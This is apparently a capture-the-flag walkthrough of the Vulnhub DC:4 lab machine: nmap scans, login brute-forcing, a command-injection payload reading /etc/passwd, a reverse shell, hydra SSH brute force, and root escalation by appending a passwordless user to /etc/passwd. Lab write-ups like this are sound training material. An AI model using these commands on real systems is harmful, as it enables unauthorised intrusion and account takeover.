# DC:4 Vulnhub Walkthrough

## Scanning

**nmap 192.168.122.188**

**nmap -sV -A 192.168.122.188**

**nmap -sV -A --script vuln 192.168.122.188**

```jsx
──(root💀kali)-[~]
└─# nmap 192.168.122.188     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-17 00:28 EDT
Nmap scan report for 192.168.122.188
Host is up (0.0010s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:41:10:20 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
                                                                                                                                                             
┌──(root💀kali)-[~]
└─# nmap -sV -A 192.168.122.188
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-17 00:29 EDT
Nmap scan report for 192.168.122.188
Host is up (0.00051s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
MAC Address: 00:0C:29:41:10:20 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 192.168.122.188

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
                                                                                                                                                             
┌──(root💀kali)-[~]
└─# nmap -sV -A --script vuln 192.168.122.188
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-17 00:30 EDT
Nmap scan report for 192.168.122.188
Host is up (0.00052s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4p1: 
|       EDB-ID:21018    10.0    https://vulners.com/exploitdb/EDB-ID:21018      *EXPLOIT*
|       CVE-2001-0554   10.0    https://vulners.com/cve/CVE-2001-0554
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/        *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-25017/        5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/     5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/      *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/        *EXPLOIT*
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/       *EXPLOIT*
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/       *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/     *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/        *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/  *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS  *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       EDB-ID:45233    4.6     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/      *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2007-2768   4.3     https://vulners.com/cve/CVE-2007-2768
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       EDB-ID:46193    0.0     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       1337DAY-ID-32009        0.0     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    nginx 1.15.10
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.122.188
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.122.188:80/
|     Form id: 
|     Form action: login.php
|     
|     Path: http://192.168.122.188:80/login.php
|     Form id: 
|_    Form action: login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: nginx/1.15.10
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:igor_sysoev:nginx:1.15.10: 
|       CVE-2019-9513   7.8     https://vulners.com/cve/CVE-2019-9513
|       CVE-2019-9511   7.8     https://vulners.com/cve/CVE-2019-9511
|       CVE-2021-23017  7.5     https://vulners.com/cve/CVE-2021-23017
|       CVE-2019-9516   6.8     https://vulners.com/cve/CVE-2019-9516
|       PACKETSTORM:162830      0.0     https://vulners.com/packetstorm/PACKETSTORM:162830      *EXPLOIT*
|_      MSF:AUXILIARY/SCANNER/HTTP/JOOMLA_ECOMMERCEWD_SQLI_SCANNER/     0.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/JOOMLA_ECOMMERCEWD_SQLI_SCANNER/   *EXPLOIT*
MAC Address: 00:0C:29:41:10:20 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.122.188

OS and Service detection performed. Please report any incorrect results at https
Nmap done: 1 IP address (1 host up) scanned in 88.41 seconds
                                                                                
┌──(root💀kali)-[~]
└─#
```

## Exploiting

*Browsing the Targets IP Address in the browser and found an Admin Information Security Login page.*

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled.png)

*Bruteforcing user admin to find out password and we found password is **happy***

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%201.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%201.png)

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%202.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%202.png)

*We have successfully logged in as Admin.*

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%203.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%203.png)

*There is some command option. Using list file option which displayed files of the database.*

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%204.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%204.png)

*Intercept the request on burp repeater. There is command execution exists. Change payload of radio parameter*

**radio=cat+/etc/passwd**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%205.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%205.png)

*And we are successfully able to run our command.* 

*In /etc/passwd file we can see there are three user jim charles and sam.*

*Now lets try to take reverse shell.*

*Using python one liner reverse shell command to take reverse shell.*

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%206.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%206.png)

*Start nc listener on port 4242* 

*We successfully got shell.*

**whoami**

**id**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%207.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%207.png)

*Exploring the home directory for user Jim we found old-passwords.bak file in backups folder which is a backup password file.*

*As we found password list Let’s bruteforce for ssh login using hydra.*

*Save jim charles and sam in file name users*

**hydra -L users -P old-passwords.bak 192.168.122.188 ssh**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%208.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%208.png)

*Found password for jim jibril04.*

*Logging into ssh using the credentials.*

**ssh jim@192.168.122.188**

**id**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%209.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%209.png)

**cd /home/jim**

**ls -al**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2010.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2010.png)

***cat mbox***

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2011.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2011.png)

*mbox is test file which is sent by root to jim so we checked /var/mail folder*

**cd /var/mail** 

**ls -al**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2012.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2012.png)

*Found file name jim*

**cat jim**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2013.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2013.png)

*Here we found password for charles*

*Password- ^xHhA&hvim0y*

## Privilege Escalation

*Login in charles*

**su charles**

*Checking sudo rights for charles*

**sudo -l**

*It is running teehee as root without password*

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2014.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2014.png)

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2015.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2015.png)

**echo "r00t::0:0:::/bin/bash" | sudo teehee -a /etc/passwd**

*Added user r00t into /etc/passwd*

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2016.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2016.png)

*Login to r00t*

**su r00t**

*We got shell for root user*

**cd /root**

**ls -al**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2017.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2017.png)

*Found flag*

**cat flag.txt**

![DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2018.png](DC%204%20Walkthrough%2072c70f49bd45404a9f45f02276b567cb/Untitled%2018.png)
